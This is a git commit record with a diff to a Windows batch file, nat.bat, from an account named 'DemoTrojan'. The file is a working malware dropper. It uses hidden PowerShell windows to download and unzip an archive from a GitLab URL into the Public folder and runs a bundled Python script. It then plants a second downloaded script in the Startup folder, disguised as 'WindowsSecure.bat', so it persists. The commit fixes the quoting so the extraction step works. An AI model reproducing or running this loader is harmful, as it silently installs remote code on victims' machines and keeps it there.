e9a17a7b26a77d916cb0e5f4cb79d6247d10572e
DemoTrojan <168916370+DemoTrojan@users.noreply.github.com>
2024-07-14 04:26:00 -0700

    Update nat.bat

--- nat.bat
+++ nat.bat
@@ -1,4 +1,4 @@
 powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://gitlab.com/anhducratsilver/2dau/-/raw/main/A.zip', 'C:\Users\Public\Documents.zip')"
-powershell.exe -WindowStyle hidden -Command ""Expand-Archive C:\Users\Public\Documents.zip -DestinationPath C:\Users\Public\Documents""
+powershell.exe -WindowStyle hidden -Command "Expand-Archive C:\Users\Public\Documents.zip -DestinationPath C:\Users\Public\Documents"
 powershell.exe -WindowStyle Hidden -Command " C:\Users\Public\Documents\Scripts\python.exe C:\Users\Public\Documents\host.py"
 cmd/c powershell.exe "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://gitlab.com/anhducratsilver/2dau/-/raw/main/start1', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat')"
